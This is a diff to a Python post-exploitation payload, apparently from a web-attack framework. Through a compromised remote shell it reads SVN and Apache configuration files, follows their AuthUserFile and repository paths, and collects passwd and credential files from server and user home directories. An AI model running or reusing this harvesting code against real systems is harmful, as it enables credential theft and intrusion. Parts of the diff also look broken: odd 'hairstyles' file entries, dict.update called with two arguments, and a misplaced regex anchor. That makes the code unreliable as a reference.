@@ -7,25 +7,22 @@ class svn_config_files(base_payload):
     This payload shows SVN Server configuration files
     '''
     def api_read(self):
-        result = {}
-        result['parent_path'] = []
-        result['path'] = []
-        result['auth'] = []
+        self.result = {}
         files = []
 
         def parse_parent_path(config):
-            parent_path = re.findall('(?<=SVNParentPath )(.*)', config, re.MULTILINE)
+            parent_path = re.findall('^(?<=SVNParentPath )(.*)', config, re.MULTILINE)
             if parent_path:
                 return parent_path
             else:
-                return ''
+                return []
         
         def parse_path(config):
-            path = re.findall('(?<=SVNPath )(.*)', config, re.MULTILINE)
+            path = re.findall('(?<=^SVNPath )(.*)', config, re.MULTILINE)
             if path:
                 return path
             else:
-                return ''
+                return []
         
         def parse_auth_files(config):
             auth = re.findall('(?<=AuthUserFile )(.*)', config, re.MULTILINE)
@@ -37,19 +34,31 @@ class svn_config_files(base_payload):
             if auth2:
                 return auth2
             else:
-                return ''
+                return []
         
-        def multi_parser(file, file_content):
+        def multi_parser(self, file, file_content, only_parse=False):
             parent_path = parse_parent_path(file_content)
             if parent_path:
-                result['parent_path'].append(file_content)
+                for file_parsed in parent_path:
+                    parent_path_content = self.shell.read(file_parsed)
+                    if parent_path_content:
+                        self.result.update(file_parsed, parent_path_content)
+                    
             path = parse_path(file_content)
             if path:
-                result['path'].append(path)
-            auth = parse_auth(file_content)
+                for file_parsed in path:
+                    path_content = self.shell.read(file_parsed)
+                    if path_content:
+                        self.result.update(file_parsed, path_content)
+                    
+            auth = parse_auth_files(file_content)
             if auth:
-                result['auth'].append(auth)
-            result.update({file:content})
+                for file_parsed in auth:
+                    auth_content = self.shell.read(file_parsed)
+                    if auth_content:
+                        self.result.update(file_parsed, auth_content)
+            if not only_parse:
+                self.result.update({file:file_content})
 
         files.append('/etc/httpd/conf.d/subversion.conf')
         files.append('/etc/httpd/conf.d/viewvc.conf')
@@ -64,46 +73,54 @@ class svn_config_files(base_payload):
         files.append('/var/local/svn/conf/svnserve.conf')
         files.append('/srv/svn/repositories/svntest/conf/svnserve.conf')
         files.append('/var/svn/conf/commit-access-control.cfg')
+        files.append('/etc/subversion/hairstyles')
+        files.append('/etc/subversion/servers')
+        files.append('/etc/subversion/config')
 
         home_directory = self.exec_payload('users_name').values()
         for directory in home_directory:
             files.append(directory+'.subversion/config')
+            files.append(directory+'.subversion/config_backup')
+            files.append(directory+'.subversion/servers')
+            files.append(directory+'.subversion/hairstyles')
 
         apache_config_directory = self.exec_payload('apache_config_directory')['apache_directory']
-        if apache_config_directory:
-            dav_conf_file_content = self.shell.read(apache_config_directory+'mods-enabled/dav_svn.conf')
-            if dav_conf_file:
-                multi_parser(apache_config_directory+'mods-enabled/dav_svn.conf', dav_conf_file_content)
+        for directory in apache_config_directory:
+            dav_conf_file_content = self.shell.read(directory+'mods-enabled/dav_svn.conf')
+            if dav_conf_file_content:
+                multi_parser(self, directory+'mods-enabled/dav_svn.conf', dav_conf_file_content)
 
         apache_config_files= self.exec_payload('apache_config_files')['apache_config']
         for file, file_content in apache_config_files.iteritems():
             if file_content:
-                multi_parser(file, file_content)
+                multi_parser(self, file, file_content, True)
     
-        user_folders = self.exec_payload('users_name')
-        for user, folder in user_folders.iteritems():
-            if kb.kb.getData('passwordProfiling', 'passwordProfiling'):
+        if kb.kb.getData('passwordProfiling', 'passwordProfiling'):
+            user_folders = self.exec_payload('users_name').values()
+            for folder in user_folders:
                 for dirname in kb.kb.getData('passwordProfiling', 'passwordProfiling'):
                     file_content = self.shell.read(folder+dirname.lower()+'/conf/svnserve.conf')
                     passwd_content = self.shell.read(folder+dirname.lower()+'/conf/passwd')
                     if file_content:
-                        multi_parser(file_content)
+                        multi_parser(self, folder+dirname.lower()+'/conf/svnserve.conf', file_content)
                     if passwd_content:
-                        multi_parser(passwd_content)
-                    multi_parser(file, file_content)
+                        multi_parser(self, folder+dirname.lower()+'/conf/passwd', passwd_content)
+
         
         if kb.kb.getData('passwordProfiling', 'passwordProfiling'):
             for folder in kb.kb.getData('passwordProfiling', 'passwordProfiling'):
                 file_content = self.shell.read('/srv/svn/'+folder.lower()+'/conf/svnserve.conf')
                 passwd_content = self.shell.read('/srv/svn/'+folder.lower()+'/conf/passwd')
                 if file_content:
-                    multi_parser(file_content)
+                    multi_parser(self, '/srv/svn/'+folder.lower()+'/conf/svnserve.conf', file_content)
                 if passwd_content:
-                    multi_parser(passwd_content)
+                    multi_parser(self, '/srv/svn/'+folder.lower()+'/conf/passwd', passwd_content)
+
         for file in files:
-            multi_parser(file)
-        
-        return result
+            file_content = self.shell.read(file)
+            if file_content:
+                multi_parser(self, file, file_content)
+        return self.result
 
     def run_read(self):
         hashmap = self.api_read()
